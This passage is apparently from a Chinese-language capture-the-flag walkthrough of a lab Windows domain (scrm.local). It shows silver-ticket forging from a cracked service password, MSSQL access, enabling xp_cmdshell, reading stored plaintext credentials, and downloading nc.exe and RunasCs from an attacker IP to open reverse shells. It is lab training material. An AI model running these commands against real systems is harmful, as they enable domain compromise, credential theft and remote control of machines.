Iteration:0-1<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: People2People -&gt; Pearson1<br>Hardware.Mon.#1..: Util: 79%<br><br>Started: Sun Apr  7 23:40:25 2024<br>Stopped: Sun Apr  7 23:40:33 2024<br></code></pre></td></tr></table></figure>
+
+<p><code>sqlsvc</code><br><code>Pegasus60</code></p>
+<p>14、这里获取的这个用户名和密码，以及结合上面PDF里的信息，估计就是让访问SQL里的数据，或者下一步吧，如何访问了就是只能是通过票据来访问， 目前的方法只能是白银票据来访问了，毕竟我们获取的这个可能就是服务账号了。</p>
+<p>15、白银票据需要有3个关键的信息来构建，服务账号哈希、域SID、以及服务账号，那首先我们生成服务账号哈希</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ iconv -f ASCII -t UTF<span class="hljs-number">-16L</span>E &lt;(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;Pegasus60&quot;</span>) | openssl dgst -md4<br><span class="hljs-title function_">MD4</span><span class="hljs-params">(<span class="hljs-built_in">stdin</span>)</span>= b999a16500b87d17ec7f2e2a68778f05<br></code></pre></td></tr></table></figure>
+
+<p>16、通过 impacket-getPac 来获取域SID值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-getPac scrm.local/sqlsvc:Pegasus60 -targetUser administrator<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>KERB_VALIDATION_INFO <br>LogonTime:                      <br>    dwLowDateTime:                   <span class="hljs-number">867386488</span> <br>    dwHighDateTime:                  <span class="hljs-number">31099125</span> <br>LogoffTime:                     <br>    dwLowDateTime:                   <span class="hljs-number">4294967295</span> <br>    dwHighDateTime:                  <span class="hljs-number">2147483647</span> <br>KickOffTime:                    <br>    dwLowDateTime:                   <span class="hljs-number">4294967295</span> <br>    dwHighDateTime:                  <span class="hljs-number">2147483647</span> <br>PasswordLastSet:                <br>    dwLowDateTime:                   <span class="hljs-number">2585823167</span> <br>    dwHighDateTime:                  <span class="hljs-number">30921784</span> <br>PasswordCanChange:              <br>    dwLowDateTime:                   <span class="hljs-number">3297396671</span> <br>    dwHighDateTime:                  <span class="hljs-number">30921985</span> <br>PasswordMustChange:             <br>    dwLowDateTime:                   <span class="hljs-number">4294967295</span> <br>    dwHighDateTime:                  <span class="hljs-number">2147483647</span> <br>EffectiveName:                   <span class="hljs-string">&#x27;administrator&#x27;</span> <br>FullName:                        <span class="hljs-string">&#x27;&#x27; </span><br><span class="hljs-string">LogonScript:                     &#x27;</span><span class="hljs-string">&#x27; </span><br><span class="hljs-string">ProfilePath:                     &#x27;</span><span class="hljs-string">&#x27; </span><br><span class="hljs-string">HomeDirectory:                   &#x27;</span><span class="hljs-string">&#x27; </span><br><span class="hljs-string">HomeDirectoryDrive:              &#x27;</span><span class="hljs-string">&#x27; </span><br><span class="hljs-string">LogonCount:                      256 </span><br><span class="hljs-string">BadPasswordCount:                0 </span><br><span class="hljs-string">UserId:                          500 </span><br><span class="hljs-string">PrimaryGroupId:                  513 </span><br><span class="hljs-string">GroupCount:                      5 </span><br><span class="hljs-string">GroupIds:                       </span><br><span class="hljs-string">    [</span><br><span class="hljs-string">         </span><br><span class="hljs-string">        RelativeId:                      513 </span><br><span class="hljs-string">        Attributes:                      7 ,</span><br><span class="hljs-string">         </span><br><span class="hljs-string">        RelativeId:                      512 </span><br><span class="hljs-string">        Attributes:                      7 ,</span><br><span class="hljs-string">         </span><br><span class="hljs-string">        RelativeId:                      520 </span><br><span class="hljs-string">        Attributes:                      7 ,</span><br><span class="hljs-string">         </span><br><span class="hljs-string">        RelativeId:                      518 </span><br><span class="hljs-string">        Attributes:                      7 ,</span><br><span class="hljs-string">         </span><br><span class="hljs-string">        RelativeId:                      519 </span><br><span class="hljs-string">        Attributes:                      7 ,</span><br><span class="hljs-string">    ] </span><br><span class="hljs-string">UserFlags:                       544 </span><br><span class="hljs-string">UserSessionKey:                 </span><br><span class="hljs-string">    Data:                            b&#x27;</span>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<span class="hljs-number">&#x27;</span> <br>LogonServer:                     <span class="hljs-string">&#x27;DC1&#x27;</span> <br>LogonDomainName:                 <span class="hljs-string">&#x27;SCRM&#x27;</span> <br>LogonDomainId:                  <br>    Revision:                        <span class="hljs-number">1</span> <br>    SubAuthorityCount:               <span class="hljs-number">4</span> <br>    IdentifierAuthority:             b<span class="hljs-number">&#x27;</span>\x00\x00\x00\x00\x00\x05<span class="hljs-number">&#x27;</span> <br>    SubAuthority:                   <br>        [<br>             <span class="hljs-number">21</span>,<br>             <span class="hljs-number">2743207045</span>,<br>             <span class="hljs-number">1827831105</span>,<br>             <span class="hljs-number">2542523200</span>,<br>        ] <br>LMKey:                           b<span class="hljs-number">&#x27;</span>\x00\x00\x00\x00\x00\x00\x00\x00<span class="hljs-number">&#x27;</span> <br>UserAccountControl:              <span class="hljs-number">16912</span> <br>SubAuthStatus:                   <span class="hljs-number">0</span> <br>LastSuccessfulILogon:           <br>    dwLowDateTime:                   <span class="hljs-number">0</span> <br>    dwHighDateTime:                  <span class="hljs-number">0</span> <br>LastFailedILogon:               <br>    dwLowDateTime:                   <span class="hljs-number">0</span> <br>    dwHighDateTime:                  <span class="hljs-number">0</span> <br>FailedILogonCount:               <span class="hljs-number">0</span> <br>Reserved3:                       <span class="hljs-number">0</span> <br>SidCount:                        <span class="hljs-number">1</span> <br>ExtraSids:                      <br>    [<br>         <br>        Sid:                            <br>            Revision:                        <span class="hljs-number">1</span> <br>            SubAuthorityCount:               <span class="hljs-number">1</span> <br>            IdentifierAuthority:             b<span class="hljs-number">&#x27;</span>\x00\x00\x00\x00\x00\x12<span class="hljs-number">&#x27;</span> <br>            SubAuthority:                   <br>                [<br>                     <span class="hljs-number">2</span>,<br>                ] <br>        Attributes:                      <span class="hljs-number">7</span> ,<br>    ] <br>ResourceGroupDomainSid:         <br>    Revision:                        <span class="hljs-number">1</span> <br>    SubAuthorityCount:               <span class="hljs-number">4</span> <br>    IdentifierAuthority:             b<span class="hljs-number">&#x27;</span>\x00\x00\x00\x00\x00\x05<span class="hljs-number">&#x27;</span> <br>    SubAuthority:                   <br>        [<br>             <span class="hljs-number">21</span>,<br>             <span class="hljs-number">2743207045</span>,<br>             <span class="hljs-number">1827831105</span>,<br>             <span class="hljs-number">2542523200</span>,<br>        ] <br>ResourceGroupCount:              <span class="hljs-number">1</span> <br>ResourceGroupIds:               <br>    [<br>         <br>        RelativeId:                      <span class="hljs-number">572</span> <br>        Attributes:                      <span class="hljs-number">536870919</span> ,<br>    ] <br>Domain SID: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span><br><br> <span class="hljs-number">0000</span>   <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">89</span> <span class="hljs-number">20</span> BF <span class="hljs-number">29</span>  <span class="hljs-number">25</span> D0 <span class="hljs-number">28</span> <span class="hljs-number">2</span>D F6 C2 <span class="hljs-number">35</span> <span class="hljs-number">24</span>   ..... .)%.(-.<span class="hljs-number">.5</span>$<br></code></pre></td></tr></table></figure>
+
+<p>17、那截止到目前，我们就获取到关键的3个信息了，服务主题账号这个是固定的值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">b999a16500b87d17ec7f2e2a68778f05<br><br>S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span><br><br>MSSQLSvc/dc1.scrm.local<br></code></pre></td></tr></table></figure>
+
+<p>18、构造白银票据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span> -domain scrm.local -user-id <span class="hljs-number">500</span> Administrator -spn MSSQLSvc/dc1.scrm.local<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Creating basic skeleton ticket and PAC Infos<br>[*] Customizing ticket <span class="hljs-keyword">for</span> scrm.local/Administrator<br>[*]     PAC_LOGON_INFO<br>[*]     PAC_CLIENT_INFO_TYPE<br>[*]     EncTicketPart<br>[*]     EncTGSRepPart<br>[*] Signing/Encrypting final ticket<br>[*]     PAC_SERVER_CHECKSUM<br>[*]     PAC_PRIVSVR_CHECKSUM<br>[*]     EncTicketPart<br>[*]     EncTGSRepPart<br>[*] Saving ticket in Administrator.ccache<br></code></pre></td></tr></table></figure>
+
+<p>19、导入本地票据，并使用票据登录mssql数据库</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ KRB5CCNAME=Administrator.ccache impacket-mssqlclient -k dc1.scrm.local<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: <span class="hljs-number">4096</span>, New Value: <span class="hljs-number">16192</span><br>[*] INFO(DC1): Line <span class="hljs-number">1</span>: Changed database context to <span class="hljs-string">&#x27;master&#x27;</span>.<br>[*] INFO(DC1): Line <span class="hljs-number">1</span>: Changed language setting to us_english.<br>[*] ACK: Result: <span class="hljs-number">1</span> - Microsoft SQL Server (<span class="hljs-number">150</span> <span class="hljs-number">7208</span>) <br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br>SQL (SCRM\administrator  dbo@master)&gt; <br></code></pre></td></tr></table></figure>
+
+<p>20、那这里就是数据库翻阅下了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">SQL (SCRM\administrator  dbo@master)&gt; select name, database_id from sys.databases;<br>name         database_id   <br>----------   -----------   <br>master                 <span class="hljs-number">1</span>   <br><br>tempdb                 <span class="hljs-number">2</span>   <br><br>model                  <span class="hljs-number">3</span>   <br><br>msdb                   <span class="hljs-number">4</span>   <br><br>ScrambleHR             <span class="hljs-number">5</span>   <br><br>SQL (SCRM\administrator  dbo@master)&gt; SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;<br>TABLE_NAME   <br>----------   <br>Employees    <br><br>UserImport   <br><br>Timesheets   <br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(SCRM\administrator  dbo@master)</span>&gt; SELECT * from ScrambleHR.dbo.UserImport;<br>LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   <br>--------   -----------------   ----------   ---------------   -------------   <br>MiscSvc    ScrambledEggs9900   scrm.local                <span class="hljs-number">90</span>               <span class="hljs-number">0</span>   <br><br>SQL (SCRM\administrator  dbo@master)&gt; <br></code></pre></td></tr></table></figure>
+
+<p>21、其实并没有什么特殊的发现，只是看到了一个用户账号密码，那就是常规的MSSQL数据库函数命令执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">SQL (SCRM\administrator  dbo@master)&gt; SELECT <span class="hljs-title function_">is_srvrolemember</span><span class="hljs-params">(<span class="hljs-string">&#x27;sysadmin&#x27;</span>)</span>;<br>    <br>-   <br><span class="hljs-number">1</span>   <br><br>SQL (SCRM\administrator  dbo@master)&gt; EXEC xp_cmdshell <span class="hljs-string">&#x27;net user&#x27;</span>;<br>[-] ERROR(DC1): Line <span class="hljs-number">1</span>: SQL Server blocked access to procedure <span class="hljs-string">&#x27;sys.xp_cmdshell&#x27;</span> of component <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> because this component is turned off as part of the security configuration <span class="hljs-keyword">for</span> this server. A system administrator can enable the use of <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> by using sp_configure. For more information about enabling <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, search <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> in SQL Server Books Online.<br>SQL (SCRM\administrator  dbo@master)&gt; EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;<br>[*] INFO(DC1): Line <span class="hljs-number">185</span>: Configuration option <span class="hljs-string">&#x27;show advanced options&#x27;</span> changed from <span class="hljs-number">0</span> to <span class="hljs-number">1.</span> Run the RECONFIGURE statement to install.<br>SQL (SCRM\administrator  dbo@master)&gt; RECONFIGURE;<br>SQL (SCRM\administrator  dbo@master)&gt; EXECUTE sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;<br>[*] INFO(DC1): Line <span class="hljs-number">185</span>: Configuration option <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> changed from <span class="hljs-number">0</span> to <span class="hljs-number">1.</span> Run the RECONFIGURE statement to install.<br>SQL (SCRM\administrator  dbo@master)&gt; RECONFIGURE;<br>SQL (SCRM\administrator  dbo@master)&gt; EXECUTE xp_cmdshell <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>output        <br>-----------   <br>scrm\sqlsvc   <br><br><span class="hljs-literal">NULL</span>          <br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(SCRM\administrator  dbo@master)</span>&gt; <br></code></pre></td></tr></table></figure>
+
+<p>22、到这里发现xp_cmdshell函数是可用的，那就开始尝试枚举和构造反弹shell吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c">SQL (SCRM\administrator  dbo@master)&gt; xp_cmdshell <span class="hljs-string">&quot;powershell -c pwd&quot;</span><br>output                <br>-------------------   <br><span class="hljs-literal">NULL</span>                  <br><br>Path                  <br><br>----                  <br><br>C:\Windows\system32   <br><br><span class="hljs-literal">NULL</span>                  <br><br><span class="hljs-literal">NULL</span>                  <br><br><span class="hljs-literal">NULL</span>                  <br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(SCRM\administrator  dbo@master)</span>&gt; xp_cmdshell &quot;powershell -c net user&quot;<br>output                                                                            <br>-------------------------------------------------------------------------------   <br><span class="hljs-literal">NULL</span>                                                                              <br><br>User accounts <span class="hljs-keyword">for</span> \\DC1                                                           <br><br><span class="hljs-literal">NULL</span>                                                                              <br><br>-------------------------------------------------------------------------------   <br><br>administrator            asmith                   backupsvc                       <br><br>ehooker                  Guest                    jhall                           <br><br>khicks                   krbtgt                   ksimpson                        <br><br>miscsvc                  rsmith                   sdonington                      <br><br>sjenkins                 sqlsvc                   tstar                           <br><br>The command completed successfully.                                               <br><br><span class="hljs-literal">NULL</span>                                                                              <br><br><span class="hljs-literal">NULL</span>                                                                              <br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(SCRM\administrator  dbo@master)</span>&gt; <br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(SCRM\administrator  dbo@master)</span>&gt; xp_cmdshell &quot;powershell -c cd C:\Users\sqlsvc\Downloads; wget http:<span class="hljs-comment">//10.10.14.27/nc.exe -outfile nc.exe&quot;</span><br>output   <br>------   <br><span class="hljs-literal">NULL</span>     <br><br><span class="hljs-title function_">SQL</span> <span class="hljs-params">(SCRM\administrator  dbo@master)</span>&gt; xp_cmdshell &quot;powershell -c cd C:\Users\sqlsvc\Downloads; .\nc.exe -e powershell <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.27</span> <span class="hljs-number">443</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop/tools]</span><br><span class="hljs-string">└─$ python3 -m http.server 80                                        </span><br><span class="hljs-string">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="hljs-string">10.10.11.168 - - [08/Apr/2024 21:26:53] &quot;</span>GET /nc.exe HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">&quot; 200 -</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$ rlwrap nc -lnvp 443                          </span><br><span class="hljs-string">listening on [any] 443 ...</span><br><span class="hljs-string">connect to [10.10.14.27] from (UNKNOWN) [10.10.11.168] 52616</span><br><span class="hljs-string">Windows PowerShell </span><br><span class="hljs-string">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="hljs-string"></span><br><span class="hljs-string">PS C:\Users\sqlsvc\Downloads&gt; whoami</span><br><span class="hljs-string">whoami</span><br><span class="hljs-string">scrm\sqlsvc</span><br><span class="hljs-string">PS C:\Users\sqlsvc\Downloads&gt; </span><br></code></pre></td></tr></table></figure>
+
+<p>23、到这里成功获取到一个shell环境了，但是，这个并不是第一个用户，不过我们在数据库里发现的用户，和系统上的账号似乎一样，那是不是可以尝试利用这个数据库里知道的密码去获取一个shell？</p>
+<p><code>MiscSvc</code></p>
+<p><code>ScrambledEggs9900</code></p>
+<p><code>runas /user:MiscSvc ScrambledEggs9900 cmd</code></p>
+<p>24、下面，我们使用的是github上的 runascs 这个工具，便于我们结合runas命令来获取反弹shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\sqlsvc\Downloads&gt; certutil -urlcache -f http:<span class="hljs-comment">//10.10.14.27/RunasCs.exe RunasCs.exe  </span><br>certutil -urlcache -f http:<span class="hljs-comment">//10.10.14.27/RunasCs.exe RunasCs.exe  </span><br>****  Online  ****<br>CertUtil: -URLCache command completed successfully.<br><br>PS C:\Users\sqlsvc\Downloads&gt; dir<br>dir<br><br><br>    Directory: C:\Users\sqlsvc\Downloads<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----       <span class="hljs-number">08</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2024</span>     <span class="hljs-number">14</span>:<span class="hljs-number">23</span>          <span class="hljs-number">68608</span> nc.exe                                                                <br>-a----       <span class="hljs-number">08</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2024</span>     <span class="hljs-number">14</span>:<span class="hljs-number">40</span>          <span class="hljs-number">51712</span> RunasCs.exe                                                           <br><br><br><br>PS C:\Users\sqlsvc\Downloads&gt; <br></code></pre></td></tr></table></figure>
+
+<p>25、尝试获取反弹shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/tools/RunasCs]<br>└─$ python3 -m http.server <span class="hljs-number">80</span><br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//0.0.0.0:80/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span> - - [<span class="hljs-number">08</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">44</span>:<span class="hljs-number">10</span>] <span class="hljs-string">&quot;GET /RunasCs.exe HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span> - - [<span class="hljs-number">08</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">44</span>:<span class="hljs-number">10</span>] <span class="hljs-string">&quot;GET /RunasCs.exe HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><br>.\RunasCs.exe miscsvc ScrambledEggs9900 powershell -r <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.27</span>:<span class="hljs-number">4444</span> -l <span class="hljs-number">3</span><br><br>PS C:\Users\sqlsvc\Downloads&gt; .\RunasCs.exe miscsvc ScrambledEggs9900 powershell -r <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.27</span>:<span class="hljs-number">4444</span> -l <span class="hljs-number">3</span><br>.\RunasCs.exe miscsvc ScrambledEggs9900 powershell -r <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.27</span>:<span class="hljs-number">4444</span> -l <span class="hljs-number">3</span><br>[*] Warning: LoadUserProfile failed due to insufficient permissions<br><br>[+] Running in session <span class="hljs-number">0</span> with process function CreateProcessAsUserW()<br>[+] Using Station\Desktop: Service<span class="hljs-number">-0x0</span><span class="hljs-number">-659</span>c0$\Default<br>[+] Async process <span class="hljs-string">&#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27;</span> with pid <span class="hljs-number">4884</span> created in background.<br><br>PS C:\Users\sqlsvc\Downloads&gt; <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">4444</span>           <br>listening on [any] <span class="hljs-number">4444</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.27</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span>] <span class="hljs-number">52756</span><br>Windows PowerShell <br>Copyright (C) Microsoft Corporation. All rights reserved.<br><br>PS C:\Windows\System32&gt; whoami<br>whoami<br>scrm\miscsvc<br>PS C:\Windows\System32&gt; <br></code></pre></td></tr></table></figure>
+
+<p>26、那就获取第一个flag的值吧</p>
